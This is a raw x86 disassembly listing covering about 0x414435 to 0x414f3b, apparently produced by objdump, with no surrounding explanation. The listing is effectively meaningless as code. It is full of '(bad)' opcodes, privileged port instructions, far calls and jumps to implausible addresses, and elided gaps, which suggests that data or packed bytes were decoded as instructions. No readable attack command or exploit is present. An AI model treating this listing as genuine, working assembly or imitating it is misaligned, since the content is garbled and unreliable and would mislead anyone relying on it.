  414435:	add    edi,DWORD PTR [esi]
  414437:	pop    ebx
  414438:	push   0xfffffffe
  41443a:	test   eax,0x98d17b5b
  41443f:	test   al,0xef
  414441:	or     BYTE PTR [edx],0x23
  414444:	add    BYTE PTR [eax+0xce75b51],al
  41444a:	jle    0x4143f3
  41444c:	es aam 0x78
  41444f:	test   al,0xef
  414451:	imul   ecx,DWORD PTR ds:0x703e76a,0x5e
  414458:	test   al,0x8b
  41445a:	mov    DWORD PTR [esi],esi
  41445c:	adc    al,BYTE PTR [ecx+edx*1+0x78283450]
  414463:	pop    ebx
  414464:	out    0xd2,eax
  414466:	popa   
  414467:	(bad)  
  414468:	test   BYTE PTR [ebx],0x3e
  41446b:	push   esi
  41446c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41446d:	clc    
  41446e:	push   edx
  41446f:	mov    esi,DWORD PTR [edi]
  414471:	ins    BYTE PTR es:[edi],dx
  414472:	stos   BYTE PTR es:[edi],al
  414473:	(bad)  
  414474:	xchg   esi,eax
  414475:	jg     0x41442d
  414477:	xchg   edi,eax
  414478:	xchg   ebx,eax
  414479:	fisttp QWORD PTR [esi+0x6c77fd22]
  41447f:	xor    ebx,DWORD PTR [esi-0x30]
  414482:	adc    BYTE PTR [edx],ah
  414484:	add    DWORD PTR [edx+0x0],eax
	...
  4144ae:	add    BYTE PTR [eax],al
  4144b0:	inc    eax
  4144b1:	fwait
  4144b2:	xor    BYTE PTR [ecx+0x66cfa83d],0xf7
  4144b9:	sub    ecx,ebp
  4144bb:	test   eax,0x62fe2101
  4144c0:	imul   DWORD PTR ds:0x567c205a
  4144c6:	add    BYTE PTR [esp+eax*8+0x76258235],bl
  4144cd:	mov    BYTE PTR [ebp+0x6a],dl
  4144d0:	jg     0x4144a9
  4144d2:	dec    ecx
  4144d3:	test   al,0x3d
  4144d5:	pop    ebx
  4144d6:	jae    0x4144c7
  4144d8:	cwde   
  4144d9:	jg     0x4144a2
  4144db:	sub    ecx,DWORD PTR [esi+0x5b]
  4144de:	mov    ebp,DWORD PTR [ebp+ebp*1+0x3194fd92]
  4144e5:	xor    edi,DWORD PTR [eax+0xa211898]
  4144eb:	sub    DWORD PTR [ecx-0x29],eax
  4144ee:	sub    ebp,eax
  4144f0:	cmp    eax,0x16c7f5b
  4144f5:	and    bh,dh
  4144f7:	stc    
  4144f8:	cmp    eax,0x3af68152
  4144fd:	pop    ebx
  4144fe:	add    dh,dl
  414500:	and    ax,0x54fe
  414504:	loop   0x41453f
  414506:	inc    ebp
  414507:	sbb    al,0xd9
  414509:	and    BYTE PTR [edx],cl
  41450b:	test   eax,0xe804d840
  414510:	cmp    eax,0x34fd5b
	...
  41453d:	add    BYTE PTR [esi+0x25a17420],bh
  414543:	retf   
  414544:	sub    BYTE PTR gs:[edx],bh
  414547:	xor    edx,edx
  414549:	xchg   edi,eax
  41454a:	test   al,0x21
  41454c:	mov    BYTE PTR [esi+ebp*4],ah
  41454f:	and    DWORD PTR [eax+eax*1-0x3d],esi
  414553:	mov    eax,ds:0xdc2ff874
  414558:	inc    cx
  41455a:	pop    ss
  41455b:	mov    ch,0xbd
  41455d:	(bad)  
  41455e:	nop
  41455f:	mov    eax,ds:0xa18f4588
  414564:	je     0x414562
  414566:	nop
  414567:	and    esi,esi
  414569:	push   0x413971
  41456e:	jg     0x41455b
  414570:	sti    
  414571:	inc    DWORD PTR [eax+0x64e444cf]
  414577:	pop    ebx
  414578:	in     al,dx
  414579:	add    al,ah
  41457b:	fsubr  DWORD PTR [eax-0x7ea32900]
  414581:	jge    0x4145d2
  414583:	pop    esp
  414584:	or     eax,0x5c3084
  414589:	add    BYTE PTR [ebx+ebx*2],dl
  41458c:	in     al,0x0
  41458e:	sbb    al,0x94
  414591:	add    BYTE PTR [edi+0x2f75fd5c],ah
  414597:	mov    ah,0x61
  414599:	ss xchg edi,eax
  41459b:	pop    esp
  41459c:	mov    DWORD PTR [ebp+0x3f],esi
  41459f:	aad    0xfb
  4145a1:	mov    eax,DWORD PTR [eax]
	...
  4145cb:	add    BYTE PTR [edi-0x73ae1774],ch
  4145d1:	jno    0x414639
  4145d3:	lods   eax,DWORD PTR ds:[esi]
  4145d4:	push   ebx
  4145d5:	addr16 jb 0x4145e0
  4145d8:	xor    esp,DWORD PTR [ebp+esi*2+0x4]
  4145dc:	xor    esp,DWORD PTR [edi-0x17]
  4145df:	add    al,0x43
  4145e1:	sbb    al,0x2
  4145e3:	or     dl,bh
  4145e5:	fisubr DWORD PTR ds:0xf9dc5d72
  4145eb:	cmp    DWORD PTR [eax+0x58],ebx
  4145ee:	sub    ah,0x17
  4145f1:	mov    bl,0x3
  4145f3:	cmp    BYTE PTR [esi],0xd6
  4145f6:	sar    DWORD PTR [edi-0x6],0x3b
  4145fa:	inc    edx
  4145fb:	fild   WORD PTR [edx+0x2c]
  4145fe:	inc    esi
  4145ff:	test   eax,0x744b2d87
  414604:	clc    
  414605:	dec    edx
  414606:	mov    DWORD PTR [edx+eiz*8-0x50],ecx
  41460a:	cmc    
  41460b:	out    0xc9,eax
  41460d:	out    dx,al
  41460e:	popa   
  41460f:	(bad)  
  414610:	jnp    0x4145ac
  414612:	add    al,0x0
  414614:	xor    cl,BYTE PTR ds:[edi-0x181df5bc]
  41461b:	add    BYTE PTR [edx+esi*1-0x18],ah
  41461f:	jmp    DWORD PTR [edi+0x32]
  414622:	call   0x5e300126
  414627:	dec    edi
  414628:	rol    DWORD PTR [esi],0x86
  41462b:	dec    edx
  41462c:	push   DWORD PTR [ecx]
  41462e:	or     eax,eax
	...
  414658:	add    BYTE PTR [eax],al
  41465a:	sub    dl,BYTE PTR [ecx+eax*4]
  41465d:	jl     0x4145e5
  41465f:	xor    esi,esi
  414661:	sbb    esp,DWORD PTR [ecx+0x13fe55c6]
  414667:	jp     0x4146e4
  414669:	je     0x414605
  41466b:	and    bh,dh
  41466d:	jmp    0x4145f8
  41466f:	sahf   
  414670:	or     eax,ebp
  414672:	ret    
  414673:	sub    eax,0x7e79fe7d
  414678:	pop    esp
  414679:	out    0x67,eax
  41467b:	inc    esi
  41467c:	add    al,0x0
  41467e:	imul   edi,DWORD PTR [esi+0x70],0x7b7b67e7
  414685:	(bad)  
  414686:	pop    ecx
  414687:	pop    esi
  414688:	ins    BYTE PTR es:[edi],dx
  414689:	out    0x4f,eax
  41468b:	imul   edi,DWORD PTR [ebx-0x2],0x49
  41468f:	pop    esi
  414690:	push   0x7b7b57e7
  414695:	dec    bl
  414697:	pop    ebx
  414698:	sub    al,0x74
  41469a:	xor    DWORD PTR [ebx],0x1f28d300
  4146a0:	aaa    
  4146a1:	fdivrp st(6),st
  4146a3:	sbb    esp,ebx
  4146a5:	add    esi,DWORD PTR [ebx-0x2e]
  4146a8:	xchg   ebx,eax
  4146a9:	cmp    ch,0x1f
  4146ac:	adc    al,BYTE PTR [esp+edx*4]
  4146af:	cwde   
  4146b0:	jbe    0x4146a8
  4146b2:	cmp    DWORD PTR [ebx],esi
  4146b4:	call   0x71603f84
  4146b9:	(bad)  
  4146ba:	cmc    
  4146bb:	push   ds
  4146bc:	aad    0xb
	...
  4146e6:	add    BYTE PTR [eax],al
  4146e8:	(bad)  
  4146e9:	jns    0x41473f
  4146eb:	jl     0x4146cd
  4146ed:	mov    cl,0xe4
  4146ef:	imul   ecx,DWORD PTR [ebx-0x72],0x46
  4146f3:	jl     0x414739
  4146f5:	sbb    esi,DWORD PTR [ebp+ebx*1+0x4fbfb36e]
  4146fc:	add    DWORD PTR [ebx-0x41],ebx
  4146ff:	add    edi,DWORD PTR [esi]
  414701:	cs data16 jmp 0x414732
  414705:	mov    dh,0xa8
  414707:	add    ecx,DWORD PTR [esi]
  414709:	push   ds
  41470a:	popf   
  41470b:	or     edx,DWORD PTR [esi-0x678366c5]
  414711:	xor    ebx,DWORD PTR [ecx+ecx*8-0x70]
  414715:	push   ds
  414716:	push   ebp
  414718:	test   DWORD PTR [esi],ebx
  41471a:	jge    0x414727
  41471c:	xchg   esi,eax
  41471d:	push   esi
  41471e:	lahf   
  41471f:	jl     0x414799
  414721:	adc    al,0xaa
  414723:	add    BYTE PTR [esi],bh
  414725:	mov    BYTE PTR [edx+0x68],dh
  414728:	mov    esp,0xd7d3d417
  41472d:	pop    edx
  41472e:	inc    ecx
  41472f:	ret    0xa858
  414732:	out    dx,eax
  414733:	imul   esp,DWORD PTR [edi-0x4984416a],0xffffff98
  41473a:	add    BYTE PTR [ebp+0x212e5fb1],dh
  414740:	add    ebx,DWORD PTR [esi]
  414742:	jle    0x41472a
  414744:	cmp    eax,0x83114fa7
  414749:	mov    ch,0x3f
  41474b:	jmp    0x414750
	...
  414774:	add    BYTE PTR [eax],al
  414776:	or     al,0x36
  414778:	int3   
  414779:	xlat   BYTE PTR ds:[ebx]
  41477a:	cmp    eax,0xea9095b
  41477f:	pop    esp
  414780:	jmp    0x66245d73
  414785:	sub    BYTE PTR [edx],bh
  414787:	xchg   al,ch
  414789:	sub    eax,0xf2005b2c
  41478e:	jge    0x41473a
  414790:	and    DWORD PTR [esi+0x56544e55],esi
  414796:	gs push ecx
  414798:	rcl    ch,0x3a
  41479b:	mov    ebp,DWORD PTR [eax-0x17]
  41479e:	cmp    eax,0x75d1bf2e
  4147a3:	mov    ch,0x3f
  4147a5:	jmp    0xe1b56497
  4147aa:	and    eax,0x35267146
  4147af:	and    BYTE PTR ss:[ebx-0x2502e2dc],dh
  4147b6:	std    
  4147b7:	loop   0x4147b6
  4147b9:	push   cs
  4147ba:	adc    eax,0x5257f31d
  4147bf:	push   esi
  4147c0:	jae    0x414810
  4147c2:	add    eax,0x8ef6fca7
  4147c7:	push   ebp
  4147c8:	call   0xfe5dc534
  4147cd:	inc    esi
  4147ce:	add    ebx,DWORD PTR [eax*1-0x132f7117]
  4147d5:	push   0xcef60e21
	...
  414802:	add    BYTE PTR [eax],al
  414804:	aam    0xce
  414806:	inc    ebx
  414807:	add    BYTE PTR [ebx+0x9],bh
  41480a:	push   DWORD PTR [ebp+0x67]
  41480d:	mov    al,ds:0x427f0c74
  414812:	add    BYTE PTR ss:[edi],ah
  414815:	dec    esi
  414816:	ror    BYTE PTR [edi],0xa2
  414819:	imul   eax,DWORD PTR [edx],0x0
  41481c:	pop    ss
  41481d:	call   0x0:0x5917f844
  414824:	loopne 0x414841
  414826:	out    dx,al
  414827:	jmp    DWORD PTR [eax]
  414829:	pop    ecx
  41482a:	add    BYTE PTR [edx+0x17],ch
  41482d:	das    
  41482e:	(bad)  
  41482f:	imul   edx,DWORD PTR [edi],0x228cfe2f
  414835:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414836:	dec    ebp
  414837:	lea    esp,[edx-0x58]
  41483a:	idiv   bh
  41483c:	mov    BYTE PTR [eax],cl
  41483e:	push   DWORD PTR [ebp-0x71]
  414841:	mov    eax,ds:0xb17ffc74
  414846:	xor    al,0x0
  414848:	out    0x4d,eax
  41484a:	shl    BYTE PTR [edx+eiz*8-0x51],0xf5
  41484f:	add    edi,edx
  414851:	pop    eax
  414852:	push   0xfe17df86
  414857:	(bad)  
  414858:	ror    BYTE PTR [eax-0x18],cl
  41485b:	inc    eax
  41485c:	fisub  DWORD PTR [ecx-0x77e3af02]
  414862:	mov    WORD PTR [ebp-0x156c9],es
	...
  414890:	add    BYTE PTR [eax],al
  414892:	mov    bh,0x6
  414894:	out    0x30,al
  414896:	fisub  DWORD PTR [ecx-0x4bed7602]
  41489c:	idiv   bh
  41489e:	push   0x584983b1
  4148a3:	mov    ds:0x793458c,al
  4148a8:	es ds call 0xc758:0xffc1
  4148b0:	push   0x781551f6
  4148b5:	je     0x4148f1
  4148b7:	or     al,BYTE PTR [eax-0x761abeb5]
  4148bd:	test   BYTE PTR [esi],dl
  4148bf:	in     eax,0x77
  4148c1:	(bad)  
  4148c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148c3:	xor    ch,dl
  4148c5:	cs xchg esi,eax
  4148c7:	jae    0x4148cd
  4148c9:	(bad)  
  4148ca:	jmp    0x4148a1
  4148cc:	outs   dx,DWORD PTR ds:[esi]
  4148cd:	(bad)  
  4148ce:	sbb    ebp,ecx
  4148d0:	in     eax,dx
  4148d1:	or     esp,DWORD PTR [esi]
  4148d3:	inc    esi
  4148d4:	enter  0x9fe,0xab
  4148d8:	jge    0x4148c1
  4148da:	or     DWORD PTR [ebp+0x5a3e6977],esp
  4148e0:	ds push 0xb479327f
  4148e6:	fiadd  DWORD PTR [edi+esi*2+0x5fee1fe]
  4148ed:	call   0xfeba0761
  4148f2:	(bad)  
  4148f3:	scas   al,BYTE PTR es:[edi]
  4148f4:	pusha  
  4148f5:	test   BYTE PTR [eax],0x0
	...
  414920:	leave  
  414921:	pop    esp
  414922:	test   DWORD PTR [edx+ebp*8+0xefe775c],eax
  414929:	sbb    dl,ah
  41492b:	push   DWORD PTR [bx+di]
  41492e:	jns    0x4148e4
  414930:	call   0x5be:0xa1fe7744
  414937:	call   0xfeba078b
  41493c:	inc    ebp
  41493d:	jb     0x41492f
  41493f:	sbb    BYTE PTR [ebp-0x7e09afa2],bh
  414945:	and    al,0xfe
  414947:	je     0x414997
  414949:	sub    eax,0x5abb8f32
  41494e:	(bad)  
  41494f:	jo     0x4149b9
  414951:	sbb    edi,DWORD PTR [eax]
  414953:	ins    BYTE PTR es:[edi],dx
  414954:	arpl   WORD PTR [edx+0x466478d6],dx
  41495a:	loop   0x41499f
  41495c:	int    0x54
  41495e:	pop    ss
  41495f:	ins    BYTE PTR es:[edi],dx
  414960:	dec    edi
  414961:	xchg   edx,eax
  414962:	mov    esi,0xc7d57878
  414967:	jo     0x4149a1
  414969:	sbb    edx,ebp
  41496b:	add    edi,DWORD PTR [esi]
  41496d:	pop    ebx
  41496e:	adc    DWORD PTR [esi+edx*4],eax
  414971:	pushf  
  414972:	movnti DWORD PTR [ecx],esp
  414975:	sbb    bl,BYTE PTR [ebp+0x67]
  414978:	adc    BYTE PTR [ebx],bl
  41497a:	(bad)  
  41497b:	js     0x414907
  41497d:	addr16 (bad) 
  41497f:	ins    BYTE PTR es:[edi],dx
  414980:	je     0x41499c
  414982:	jg     0x41490e
	...
  4149ac:	add    BYTE PTR [eax],al
  4149ae:	mov    edx,0xf8787f37
  4149b3:	test   edi,esp
  4149b5:	jmp    0x414949
  4149b7:	sub    DWORD PTR [eax+0x4bd0e903],0x70
  4149be:	loopne 0x4149da
  4149c0:	push   edi
  4149c1:	out    dx,al
  4149c2:	inc    ebp
  4149c3:	add    edi,DWORD PTR [eax]
  4149c5:	int3   
  4149c6:	rcr    BYTE PTR [edx],1
  4149c8:	jno    0x414a48
  4149ca:	stc    
  4149cb:	adc    bh,BYTE PTR [edi]
  4149cd:	js     0x41498b
  4149cf:	fmul   DWORD PTR [edi]
  4149d1:	jo     0x41498b
  4149d3:	sbb    ch,al
  4149d5:	or     BYTE PTR [edx+0x3e03e7ef],bh
  4149db:	or     DWORD PTR [edi+0x645afeeb],0xffffffbe
  4149e2:	lea    ebp,[ebx+0x1269ae0e]
  4149e8:	pop    es
  4149e9:	js     0x41498c
  4149eb:	imul   edi,DWORD PTR [ecx+0x78],0x29006680
  4149f2:	imul   edx,DWORD PTR [esi+0x19e16c81],0xd7bd5f72
  4149fc:	in     al,0xd6
  4149fe:	jmp    0x679e4b1b
  414a03:	fnstsw WORD PTR [ebx-0x1e71e3f]
  414a09:	jmp    0xd9a9c867
  414a0e:	cmp    eax,0xb6bf0a
	...
  414a3b:	add    BYTE PTR [edi],ch
  414a3d:	(bad)  
  414a3e:	call   0xfe5a4913
  414a43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a44:	out    dx,eax
  414a45:	add    esi,esi
  414a47:	sahf   
  414a48:	test   eax,0xa5e17419
  414a4d:	xchg   DWORD PTR [ebx-0x72],eax
  414a50:	mov    DWORD PTR [ecx],ebx
  414a52:	mov    ah,0x8d
  414a54:	cdq    
  414a55:	sbb    esi,edi
  414a57:	jle    0x414a68
  414a59:	(bad)  
  414a5a:	call   0xfe5a4975
  414a5f:	outs   dx,BYTE PTR ds:[esi]
  414a60:	out    dx,eax
  414a61:	or     eax,0x118a9cfe
  414a66:	(bad)  
  414a67:	pop    esi
  414a68:	imul   ecx,DWORD PTR [edi-0x5fe3bef8],0xcf494efd
  414a72:	loopne 0x414ab2
  414a74:	push   ecx
  414a75:	sbb    esi,edi
  414a77:	mov    ah,0x35
  414a79:	add    ebx,edi
  414a7b:	lods   eax,DWORD PTR ds:[esi]
  414a7c:	xor    BYTE PTR [ecx],bl
  414a7e:	(bad)  
  414a7f:	je     0x414a97
  414a81:	adc    esi,edi
  414a83:	xor    DWORD PTR es:[edi-0x5f93eef8],ecx
  414a8a:	std    
  414a8b:	push   ss
  414a8c:	adc    edi,ecx
  414a8e:	rcl    BYTE PTR [esi],1
  414a90:	or     DWORD PTR [ecx],ebx
  414a92:	inc    BYTE PTR [eax]
  414a94:	or     ah,BYTE PTR [esi-0x18]
  414a97:	and    al,0xda
  414a99:	nop
  414a9a:	(bad)  
  414a9b:	(bad)  
  414a9c:	cmp    dh,BYTE PTR [edi+0xfff6]
	...
  414aca:	pusha  
  414acb:	test   DWORD PTR [ebx],eax
  414acd:	dec    eax
  414ace:	pusha  
  414acf:	nop
  414ad0:	(bad)  
  414ad1:	mov    ch,0x8f
  414ad3:	mov    dh,bh
  414ad5:	(bad)  
  414ad6:	jg     0x414a6c
  414ad8:	inc    esi
  414ad9:	inc    DWORD PTR [eax-0x77234b70]
  414adf:	nop
  414ae0:	(bad)  
  414ae1:	call   0x40236d
  414ae6:	lock retf 
  414ae8:	loope  0x414ae1
  414aea:	loopne 0x414a7d
  414aec:	in     eax,0xe5
  414aee:	pop    eax
  414aef:	nop
  414af0:	(bad)  
  414af1:	dec    DWORD PTR [edx-0x4f000954]
  414af7:	test   bh,dl
  414af9:	inc    edi
  414afa:	rcl    BYTE PTR [ecx-0x764c4a02],0xfe
  414b01:	inc    DWORD PTR [eax-0x500f5f5]
  414b07:	fs call 0xfed2add3
  414b0d:	dec    edx
  414b0f:	xor    dh,0xff
  414b12:	add    BYTE PTR [ebx+edi*4-0x16e8fb9],0x45
  414b1a:	outs   dx,DWORD PTR ds:[esi]
  414b1b:	xchg   edi,edx
  414b1d:	std    
  414b1e:	adc    BYTE PTR [ecx-0x7bfc8a02],0xd7
  414b25:	xor    esp,DWORD PTR [edi-0x6c3d38a4]
  414b2b:	pop    esp
  414b2c:	push   ebx
  414b2d:	mov    eax,DWORD PTR [eax]
	...
  414b57:	add    BYTE PTR [ebx-0x23],dl
  414b5a:	shl    esp,0x12
  414b5d:	sbb    edi,edx
  414b5f:	push   eax
  414b60:	ficom  DWORD PTR ds:[eax+ebp*2]
  414b64:	inc    DWORD PTR [ecx]
  414b66:	jmp    0xbff:0x1c321d1
  414b6d:	push   es
  414b6e:	push   0xffffffa5
  414b70:	add    al,0x11
  414b72:	je     0x414b7e
  414b74:	jle    0x414b04
  414b76:	jmp    0xeb03:0x787fbd4f
  414b7d:	pop    eax
  414b7e:	jae    0x414baf
  414b80:	leave  
  414b81:	inc    edi
  414b82:	jl     0x414b04
  414b84:	shr    DWORD PTR [ecx],cl
  414b86:	jno    0x414b88
  414b88:	ds add ch,ah
  414b8b:	push   es
  414b8c:	jns    0x414bcd
  414b8e:	jl     0x414b83
  414b90:	aas    
  414b91:	add    al,BYTE PTR [edx]
  414b93:	jmp    0x414c11
  414b95:	leave  
  414b96:	in     eax,dx
  414b97:	not    DWORD PTR [esi+0x3e40ec5d]
  414b9d:	xchg   DWORD PTR [ebp-0x1225911d],edi
  414ba3:	xor    bh,BYTE PTR [esi]
  414ba5:	add    al,BYTE PTR [ecx+0x46c3ac3]
  414bab:	lea    edi,[ebx-0x22]
  414bae:	aam    0x67
  414bb0:	or     al,0x69
  414bb2:	sar    edi,0xf0
  414bb5:	push   cs
  414bb6:	push   es
  414bb7:	call   0xfeb61847
	...
  414be4:	add    BYTE PTR [eax],al
  414be6:	xor    eax,0x6e13f042
  414beb:	sbb    al,BYTE PTR [ebx]
  414bed:	add    cl,ah
  414bef:	out    0xd4,eax
  414bf1:	(bad)  
  414bf2:	push   ebx
  414bf3:	or     ch,BYTE PTR [edx+0x3e]
  414bf6:	push   ebx
  414bf7:	pop    ecx
  414bf8:	jae    0x414be1
  414bfa:	imul   ecx,ecx,0x74
  414bfd:	(bad)  
  414bfe:	mov    cl,0xf6
  414c00:	jns    0x414b84
  414c02:	sub    ebx,DWORD PTR [ebx+0x1f]
  414c05:	add    al,0x2b
  414c07:	ror    DWORD PTR [edi],cl
  414c09:	adc    eax,0x4b171801
  414c0e:	jg     0x414c72
  414c10:	out    0xce,eax
  414c12:	mov    ah,0x6
  414c14:	imul   eax,DWORD PTR [eax-0x7b],0xffffff84
  414c18:	out    0xe9,eax
  414c1a:	add    BYTE PTR [eax],bl
  414c1c:	jge    0x414c29
  414c1e:	cwd    
  414c20:	mov    ds:0x2ce16874,eax
  414c25:	js     0x414c00
  414c27:	or     al,BYTE PTR [edi-0x3d]
  414c2a:	pop    ecx
  414c2b:	sbb    BYTE PTR ds:0xe799f9aa,bl
  414c31:	je     0x414c05
  414c33:	(bad)  
  414c34:	iret   
  414c35:	jae    0x414c7c
  414c37:	pop    ss
  414c38:	mov    edi,0x287f29eb
  414c3d:	add    al,0xa6
  414c3f:	pop    ecx
  414c40:	out    0x3,eax
  414c42:	mov    esi,0x160c1d16
  414c47:	ss pushf 
  414c49:	je     0x414c4b
	...
  414c73:	add    BYTE PTR [eax],bl
  414c75:	pop    ss
  414c76:	(bad)  [ecx+0x74e79c79]
  414c7c:	xchg   edx,eax
  414c7d:	arpl   WORD PTR [edi+0x7f17012a],cx
  414c83:	jmp    0x414cc4
  414c85:	pop    ebx
  414c86:	out    0x83,eax
  414c88:	lock nop
  414c8a:	fild   QWORD PTR [ebx+0x45]
  414c8d:	push   ss
  414c8e:	addr16 je 0x414c71
  414c91:	nop
  414c92:	pop    ebx
  414c93:	je     0x414ce7
  414c95:	arpl   WORD PTR [edi],di
  414c97:	cmp    bh,BYTE PTR [edx+0x16]
  414c9a:	dec    edi
  414c9b:	dec    edx
  414c9c:	call   FWORD PTR [edi-0x19]
  414c9f:	into   
  414ca0:	mov    ah,0x7
  414ca2:	imul   edi,DWORD PTR [edi],0xffffff95
  414ca5:	lods   eax,DWORD PTR ds:[esi]
  414ca6:	add    BYTE PTR [esi-0x5e97e959],bl
  414cac:	xor    cl,BYTE PTR [edi-0x66f9eef8]
  414cb2:	std    
  414cb3:	push   ds
  414cb4:	les    ebx,FWORD PTR [edi-0x1cb79504]
  414cba:	dec    ecx
  414cbb:	test   al,0x3d
  414cbd:	pop    ebx
  414cbe:	or     eax,0x5af86d
  414cc3:	jmp    0xa2cda486
  414cc8:	jl     0x414ce0
  414cca:	(bad)  
  414ccb:	fsubp  st(1),st
  414ccd:	aad    0xff
  414ccf:	call   0x757d2711
  414cd4:	cdq    
  414cd5:	fwait
  414cd6:	add    cl,ch
	...
  414d00:	add    BYTE PTR [eax],al
  414d02:	cmp    al,0xdf
  414d04:	mov    cl,0xe8
  414d06:	cmp    eax,0x6604815b
  414d0b:	mov    eax,ds:0x663de93f
  414d10:	test   BYTE PTR [edi+0x6a005b3b],cl
  414d16:	outs   dx,DWORD PTR ds:[esi]
  414d17:	mov    bl,0x49
  414d19:	sub    BYTE PTR [edx],bh
  414d1b:	pop    ebx
  414d1c:	or     eax,0x5acb65
  414d21:	jmp    0x229da3de
  414d26:	add    edx,DWORD PTR [esi]
  414d28:	(bad)  
  414d29:	idiv   BYTE PTR [ecx+0x3de8ffe1]
  414d2f:	fidivr DWORD PTR [ebx]
  414d31:	or     DWORD PTR [ecx+0x3ce9009a],esi
  414d37:	fistp  QWORD PTR [ebp-0x18]
  414d3a:	cmp    eax,0xb21c815b
  414d3f:	mov    al,ds:0x663de93f
  414d44:	test   bl,bl
  414d46:	inc    edx
  414d47:	pop    ebx
  414d48:	add    BYTE PTR [eax],al
  414d4a:	out    dx,eax
  414d4b:	fldenv [ebp+0x41]
  414d4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d4f:	aaa    
  414d50:	(bad)  
  414d51:	(bad)  
  414d52:	xchg   edx,eax
  414d53:	xchg   ecx,eax
  414d54:	dec    edx
  414d55:	inc    ecx
  414d56:	xchg   edi,eax
  414d57:	xchg   esi,eax
  414d58:	inc    esp
  414d59:	clc    
  414d5a:	adc    al,0xc
  414d5c:	test   BYTE PTR [eax],0xa8
  414d5f:	fst    QWORD PTR [ebp+0x1]
  414d62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d63:	pop    ecx
  414d64:	sub    esi,esi
	...
  414d8e:	add    BYTE PTR [eax],al
  414d90:	ror    DWORD PTR [eax+0x7438f874],1
  414d96:	mov    WORD PTR [ebx-0x5a],cs
  414d99:	pop    ecx
  414d9a:	mov    eax,esi
  414d9c:	pop    esp
  414d9d:	xchg   ebx,eax
  414d9e:	je     0x414da5
  414da0:	ds push ecx
  414da2:	(bad)  
  414da3:	call   DWORD PTR [edi-0x6c]
  414da6:	push   ebx
  414da7:	or     al,0xcc
  414da9:	xlat   BYTE PTR ds:[ebx]
  414daa:	gs mov ebp,ebp
  414dad:	cli    
  414dae:	mov    BYTE PTR [ebp+0x73],cl
  414db1:	adc    al,0xff
  414db3:	psrlq  mm5,QWORD PTR [edx-0x1]
  414db7:	jmp    DWORD PTR [edi]
  414db9:	mov    eax,0x5927010b
  414dbe:	push   0xfe1e7f83
  414dc3:	inc    BYTE PTR [eax]
  414dc5:	mov    cl,0x33
  414dc7:	xor    DWORD PTR [edi],esp
  414dc9:	pop    ecx
  414dca:	or     eax,eax
  414dcc:	sbb    ah,ah
  414dce:	icebp  
  414dcf:	add    BYTE PTR [edi],dl
  414dd1:	pop    ecx
  414dd2:	cmp    DWORD PTR [edi+0xf],0xcd840d59
  414dd9:	pop    eax
  414dda:	add    BYTE PTR [eax],al
  414ddc:	push   0xb8e80611
  414de1:	and    edi,edi
  414de3:	jmp    FWORD PTR [esi+0x23]
  414de6:	out    dx,al
  414de7:	push   eax
  414de9:	adc    bh,bh
  414deb:	jne    0x414e2b
  414ded:	mov    dl,0x72
  414def:	jbe    0x414e2b
  414df1:	call   0x0:0x4608
	...
  414e1c:	add    BYTE PTR [eax],al
  414e1e:	rcr    DWORD PTR [ebp-0x3cd97327],0x1
  414e25:	jmp    FWORD PTR [ebx]
  414e27:	push   edx
  414e28:	pop    ecx
  414e29:	std    
  414e2a:	outs   dx,BYTE PTR ds:[esi]
  414e2b:	add    al,BYTE PTR [edx]
  414e2d:	or     edi,DWORD PTR [esi+0xd]
  414e30:	mov    DWORD PTR [ebx+0x6a02023e],esi
  414e36:	ds jg  0x414e01
  414e39:	out    0xee,eax
  414e3b:	mov    dh,0xc8
  414e3d:	jmp    0x414e2d
  414e3f:	out    0x1,eax
  414e41:	push   0x3e
  414e43:	in     al,dx
  414e44:	jb     0x414e5a
  414e46:	retf   0xc4b9
  414e49:	push   DWORD PTR [edx+eax*2]
  414e4c:	add    al,BYTE PTR [ecx+ecx*8-0x34fffdfe]
  414e53:	aas    
  414e54:	push   0x5cb7514f
  414e59:	(bad)  
  414e5a:	rcl    ebp,cl
  414e5c:	outs   dx,DWORD PTR ds:[esi]
  414e5d:	adc    al,0xea
  414e5f:	dec    eax
  414e60:	sar    edi,0x44
  414e63:	ret    0x77f8
  414e66:	ret    
  414e67:	inc    esi
  414e68:	fs dec edi
  414e6a:	xchg   esp,eax
  414e6b:	add    bl,ah
  414e6d:	call   DWORD PTR [edi+0x18ffdc05]
  414e73:	outs   dx,DWORD PTR ds:[esi]
  414e74:	push   0xbb4a2bfe
  414e79:	inc    eax
  414e7a:	ds stc 
  414e7c:	inc    ecx
  414e7d:	jae    0x414ee7
  414e7f:	(bad)  
  414e81:	fild   WORD PTR [eax]
	...
  414eab:	add    dh,ah
  414ead:	pop    esp
  414eae:	(bad)  
  414eb1:	jp     0x414e78
  414eb3:	fstp   TBYTE PTR [ebx-0x1eb09bc2]
  414eb9:	pop    edx
  414eba:	fmul   QWORD PTR [edi+0x67]
  414ebd:	pop    ebx
  414ebe:	ror    DWORD PTR [eax],1
  414ec0:	fs pop ebx
  414ec2:	push   esi
  414ec3:	neg    ebp
  414ec5:	adc    esi,ebp
  414ec7:	retf   
  414ec8:	je     0x414e64
  414eca:	out    0xfc,eax
  414ecc:	stc    
  414ecd:	mov    ss,WORD PTR [eax]
  414ecf:	fdiv   QWORD PTR [ecx-0x574db8ed]
  414ed5:	(bad)  
  414ed6:	fistp  WORD PTR [ebx-0x78]
  414ed9:	cdq    
  414eda:	es jno 0x414e75
  414edd:	mov    edi,gs
  414edf:	jo     0x414eec
  414ee1:	pop    edi
  414ee2:	push   ss
  414ee3:	test   DWORD PTR [ecx+0x3],0x1380c30f
  414eea:	pop    es
  414eeb:	neg    DWORD PTR [ecx+0x704f7513]
  414ef1:	(bad)  
  414ef2:	fistp  WORD PTR [ebx+0x6e]
  414ef5:	cdq    
  414ef6:	out    dx,al
  414ef7:	jo     0x414f59
  414ef9:	(bad)  
  414efa:	ret    
  414efb:	pop    ebx
  414efc:	aas    
  414efd:	sahf   
  414efe:	fidiv  WORD PTR [eax+0x50]
  414f01:	(bad)  
  414f02:	retf   
  414f03:	jo     0x414f37
  414f05:	mov    bh,0x22
  414f07:	ret    
  414f08:	inc    ecx
  414f09:	and    edi,0xbeffb270
  414f0f:	push   ss
	...
  414f38:	add    BYTE PTR [eax],al
  414f3a:	sahf   
  414f3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
